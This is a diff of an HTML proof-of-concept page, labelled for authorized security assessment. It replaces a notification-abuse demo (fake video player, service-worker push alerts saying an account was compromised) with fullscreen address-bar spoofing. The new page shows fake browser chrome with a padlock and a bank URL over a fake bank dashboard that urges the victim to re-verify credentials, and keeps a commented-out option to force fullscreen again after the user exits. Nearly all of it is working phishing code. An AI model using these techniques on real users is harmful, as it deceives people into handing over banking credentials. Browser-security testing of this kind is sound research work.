@@ -2,83 +2,119 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Free Video Streaming — HD Player</title>
+<title>Secure Banking Portal — Account Dashboard</title>
 <style>
-  body { font-family: Arial, sans-serif; background: #111; color: #eee;
-         text-align: center; padding: 40px 20px; }
-  .player { max-width: 640px; margin: 0 auto; background: #1c1c1c;
-            padding: 20px; border-radius: 10px; }
-  video { width: 100%; border-radius: 6px; background: #000; }
-  button { padding: 10px 18px; margin: 10px 6px; border: none;
-           border-radius: 4px; background: #e50914; color: #fff;
-           cursor: pointer; font-size: 14px; }
-  button.secondary { background: #444; }
-  pre { text-align: left; background: #222; color: #9fd49f; padding: 10px;
-        font-size: 12px; max-width: 640px; margin: 16px auto;
-        white-space: pre-wrap; }
+  /* Simulated trusted site content rendered during fullscreen */
+  body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: #eef2f7; }
+  .portal-header { background: #0b3d62; color: #fff; padding: 14px 24px;
+                   display: flex; align-items: center; gap: 10px; }
+  .portal-header .logo { background: #fff; color: #0b3d62; font-weight: bold;
+                   padding: 4px 10px; border-radius: 4px; }
+  .portal-body { max-width: 800px; margin: 30px auto; background: #fff;
+                 padding: 24px; border-radius: 8px;
+                 box-shadow: 0 2px 10px rgba(0,0,0,.1); }
+  .portal-body h1 { font-size: 22px; color: #0b3d62; }
+  .balance { font-size: 28px; font-weight: bold; color: #0b8043; margin: 12px 0; }
+
+  /* ===== Fake browser chrome (address bar spoofing) ===== */
+  #fakeChrome { display: none; position: fixed; top: 0; left: 0; right: 0;
+                height: 58px; background: #f1f3f4; border-bottom: 1px solid #ccc;
+                z-index: 99999; padding: 8px 14px; box-sizing: border-box;
+                align-items: center; gap: 12px; }
+  #fakeChrome .nav-btns { display: flex; gap: 6px; font-size: 16px; color: #555; }
+  #fakeChrome .omnibox { flex: 1; background: #fff; border: 1px solid #ddd;
+                border-radius: 20px; padding: 9px 16px; font-size: 14px;
+                color: #202124; display: flex; align-items: center; }
+  #fakeChrome .omnibox input { border: none; outline: none; flex: 1;
+                font-size: 14px; color: #202124; }
+  #fakeChrome .padlock { color: #0b8043; margin-right: 8px; }
+  #fakeChrome .profile { width: 30px; height: 30px; border-radius: 50%;
+                background: #7b1fa2; color: #fff; display: flex;
+                align-items: center; justify-content: center; font-size: 13px; }
+  .exit-btn { position: absolute; right: 8px; bottom: -34px; font-size: 11px;
+                color: #666; cursor: pointer; background: none; border: none; }
+  body.fs-active { padding-top: 58px; }
 </style>
 </head>
 <body>
-<div class="player">
-  <h2>&#9654; HD Player — Now Playing</h2>
-  <!-- 1-second silent audio hosted on the test asset; triggers autoplay
-       eligibility so Notification.requestPermission() succeeds -->
-  <video id="vid" playsinline muted poster="poster.jpg" controls>
-    <source src="clip-1s.mp4" type="video/mp4">
-  </video>
-  <audio id="silent" src="silent-1s.mp3" preload="auto"></audio>
 
-  <button id="playBtn">&#9654; Play Episode</button>
-  <button class="secondary" onclick="registerSW()">Enable "Notifications"</button>
-  <button class="secondary" onclick="askNotif()">Request Permission Now</button>
-  <pre id="log">Status: idle</pre>
+<!-- Landing page shown before fullscreen (real browser chrome visible) -->
+<div class="portal-header">
+  <span class="logo">MeridianBank</span>
+  <span>Online Banking — Secure Portal</span>
+</div>
+<div class="portal-body">
+  <h1>Session Verification Required</h1>
+  <p>For your security, please continue to your account dashboard in
+     <b>protected display mode</b>.</p>
+  <button id="goFs" style="padding:10px 20px; background:#0b3d62; color:#fff;
+          border:none; border-radius:4px; cursor:pointer; font-size:15px;">
+    Continue to Dashboard
+  </button>
+  <p style="font-size:12px;color:#777;">[PoC — authorized security assessment only]</p>
+</div>
+
+<!-- Fake browser chrome: rendered once fullscreen hides the real UI -->
+<div id="fakeChrome">
+  <div class="nav-btns"><span>&#8592;</span><span>&#8594;</span><span>&#8635;</span><span>&#127968;</span></div>
+  <div class="omnibox">
+    <span class="padlock">&#128274;</span>
+    <input id="fakeUrl" value="https://www.meridianbank-online.com/dashboard" readonly>
+  </div>
+  <div class="profile">JB</div>
+  <button class="exit-btn" onclick="exitSpoof()">[Exit PoC &mdash; Esc]</button>
+</div>
+
+<!-- Fake bank dashboard shown behind the fake chrome -->
+<div id="fakeDashboard" style="display:none;">
+  <div class="portal-header">
+    <span class="logo">MeridianBank</span>
+    <span>Account Dashboard</span>
+  </div>
+  <div class="portal-body">
+    <h1>Welcome back, John</h1>
+    <div class="balance">IDR 248,750,300</div>
+    <p>Your session appears suspicious. Please
+       <a href="#" onclick="alert('[POC] Victim redirected to credential harvest page'); return false;">
+       re-verify your credentials</a> to avoid account suspension.</p>
+  </div>
 </div>
 
 <script>
-const log = document.getElementById('log');
+const log = () => console.log('[H5FS PoC]');
 
-/* Step 1 — silent audio/video interaction primes the user-gesture
-   requirement many browsers enforce before showing permission prompts. */
-document.getElementById('playBtn').addEventListener('click', () => {
-  const au = document.getElementById('silent');
-  au.play().then(() => {
-    log.textContent = 'Status: silent audio started. Browser now treats ' +
-      'this origin as user-engaged; permission prompt can be shown.';
-  }).catch(e => { log.textContent = 'Status: autoplay blocked — ' + e.message; });
+document.getElementById('goFs').addEventListener('click', () => {
+  const el = document.documentElement;
+  const req = el.requestFullscreen || el.webkitRequestFullscreen ||
+              el.msRequestFullscreen || el.mozRequestFullScreen;
+  if (!req) return;
+  req.call(el).then(() => {
+    // Real browser chrome (address bar) is now hidden by fullscreen.
+    document.body.classList.add('fs-active');
+    document.getElementById('fakeChrome').style.display = 'flex';
+    document.getElementById('fakeDashboard').style.display = 'block';
+    log();
+  }).catch(e => console.log('[H5FS PoC] fullscreen denied:', e.message));
 });
 
-/* Step 2 — request notification permission from the attacker origin.
-   In a real scenario the prompt is displayed while the victim's
-   attention is on the fake video player. */
-function askNotif() {
-  Notification.requestPermission().then(p => {
-    log.textContent = 'Status: permission = ' + p;
-    if (p === 'granted') {
-      new Notification('Security Alert: Your Account Was Compromised', {
-        body: 'Click to verify your identity now.',
-        icon: '/icon.png'
-      });
-    }
-  });
+function exitSpoof() {
+  if (document.fullscreenElement) document.exitFullscreen();
+  document.getElementById('fakeChrome').style.display = 'none';
+  document.getElementById('fakeDashboard').style.display = 'none';
+  document.body.classList.remove('fs-active');
 }
 
-/* Step 3 — register a service worker so notifications persist after
-   the tab is closed (the long-term spam vector used in the wild). */
-function registerSW() {
-  if (!('serviceWorker' in navigator)) {
-    log.textContent = 'Status: Service Worker unsupported.'; return;
+// Optional hardening bypass attempt: immediately re-request fullscreen if
+// the user exits via Esc (tests vendor mitigation resilience).
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement &&
+      document.getElementById('fakeChrome').style.display === 'flex') {
+    // Comment out the next line to behave politely; keep enabled to test
+    // whether re-promptingFullscreen wears down victim perception.
+    // document.getElementById('goFs').click();
+    console.log('[H5FS PoC] User exited fullscreen — mitigation check point.');
   }
-  navigator.serviceWorker.register('/sw.js').then(reg => {
-    log.textContent = 'Status: SW registered (scope ' + reg.scope + '). ' +
-      'Push notifications can now be delivered after tab close.';
-    // Immediate SW-based notification as proof of persistence path:
-    return navigator.serviceWorker.ready.then(swReg =>
-      swReg.showNotification('Verify Your Account Within 24 Hours', {
-        body: 'Failure to verify will result in permanent suspension.',
-        icon: '/icon.png'
-      }));
-  }).catch(e => { log.textContent = 'Status: SW failed — ' + e.message; });
-}
+});
 </script>
 </body>
 </html>
